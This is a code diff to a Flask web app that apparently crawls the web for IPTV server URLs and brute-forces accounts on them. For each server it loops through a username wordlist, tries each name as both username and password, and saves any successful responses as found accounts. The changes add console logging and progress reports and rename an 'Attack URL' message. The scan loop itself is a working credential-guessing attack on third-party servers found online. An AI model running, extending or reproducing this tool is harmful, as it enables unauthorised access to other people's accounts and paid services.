@@ -1,9 +1,17 @@
 import os
 import random
 import threading
+import logging
 from flask import Flask, render_template, jsonify, request, send_from_directory
 from flask_cors import CORS
 import Crawler
+
+# Configure standard Python logger for Docker/Portainer stdout logs
+logging.basicConfig(
+    level=logging.INFO,
+    format='[%(asctime)s] %(levelname)s in %(module)s: %(message)s'
+)
+logger = logging.getLogger("IPTV")
 
 app = Flask(__name__)
 CORS(app)
@@ -20,10 +28,12 @@ scan_state = {
     "logs": []
 }
 
-def log_event(message):
+def log_event(message, to_console=False):
     scan_state["logs"].append(message)
     if len(scan_state["logs"]) > 200:
         scan_state["logs"].pop(0)
+    if to_console:
+        logger.info(message)
 
 @app.route("/")
 def index():
@@ -43,7 +53,7 @@ def add_url():
     data = request.json or {}
     url = data.get("url", "").strip()
     if crawler.add_custom_url(url):
-        log_event(f"Manually added target server: {url}")
+        log_event(f"Manually added target server: {url}", to_console=True)
         return jsonify({"success": True, "message": f"Added {url}", "parsed_urls": crawler.parsedUrls})
     return jsonify({"success": False, "message": "Invalid or duplicate URL"}), 400
 
@@ -55,11 +65,11 @@ def search_links():
     def do_search():
         msg = "Searching web for IPTV server URLs..."
         scan_state["status_message"] = msg
-        log_event(msg)
+        log_event(msg, to_console=True)
         found = crawler.search_links(query)
         msg_complete = f"Search complete. Discovered {found} new servers. Total available: {len(crawler.parsedUrls)}"
         scan_state["status_message"] = msg_complete
-        log_event(msg_complete)
+        log_event(msg_complete, to_console=True)
 
     thread = threading.Thread(target=do_search)
     thread.start()
@@ -71,7 +81,7 @@ def change_language():
     lang = data.get("language", "it")
     success = crawler.change_language(lang)
     if success:
-        log_event(f"Language changed to {lang}.txt")
+        log_event(f"Language changed to {lang}.txt", to_console=True)
         return jsonify({"success": True, "language": crawler.language, "message": f"Language set to {lang}"})
     else:
         return jsonify({"success": False, "message": f"Language file for {lang} not found"}), 400
@@ -94,19 +104,19 @@ def start_scan():
             scan_state["is_scanning"] = False
             msg = "No server URLs available. Run search or add a server URL."
             scan_state["status_message"] = msg
-            log_event(msg)
+            log_event(msg, to_console=True)
             return
 
         scan_state["current_url"] = target_url
-        msg_start = f"Attack URL: {target_url}"
+        msg_start = f"Starting scan on target: {target_url}"
         scan_state["status_message"] = f"Scanning {target_url}..."
-        log_event(msg_start)
+        log_event(msg_start, to_console=True)
 
         lang_file = os.path.join(crawler.languageDir, crawler.language + ".txt")
         if not os.path.exists(lang_file):
             scan_state["is_scanning"] = False
             scan_state["status_message"] = "Language file missing."
-            log_event("Error: Language file missing.")
+            log_event("Error: Language file missing.", to_console=True)
             return
 
         with open(lang_file, "r", encoding="utf-8", errors="ignore") as f:
@@ -119,7 +129,13 @@ def start_scan():
         import requests
         for idx, username in enumerate(lines, start=1):
             scan_state["progress"] = idx
-            log_event(f"request for name: {username}")
+            # Send individual username attempt to Web UI log only
+            log_event(f"request for name: {username}", to_console=False)
+            
+            # Log periodic progress summary to Portainer logs every 25 attempts
+            if idx % 25 == 0 or idx == len(lines):
+                logger.info(f"Scan progress on {target_url}: {idx}/{len(lines)} ({round((idx/len(lines))*100)}%) - Accounts found: {found}")
+
             target = target_url + crawler.basicString % (username, username)
             try:
                 res = requests.get(target, headers=headers, timeout=4)
@@ -129,7 +145,8 @@ def start_scan():
                     crawler.create_file(username, new_path, res.text)
                     found += 1
                     scan_state["found_accounts"] = found
-                    log_event(f"ACCOUNT FOUND !!! [username: {username}]")
+                    msg_found = f"ACCOUNT FOUND! Username: {username} on {target_url}"
+                    log_event(msg_found, to_console=True)
             except Exception:
                 pass
 
@@ -137,9 +154,9 @@ def start_scan():
             crawler.parsedUrls.remove(target_url)
 
         scan_state["is_scanning"] = False
-        msg_done = f"Scan complete for {target_url}. Total accounts found: {found}"
+        msg_done = f"Scan completed for {target_url}. Total accounts found: {found}"
         scan_state["status_message"] = msg_done
-        log_event(msg_done)
+        log_event(msg_done, to_console=True)
 
     thread = threading.Thread(target=run_scan)
     thread.start()
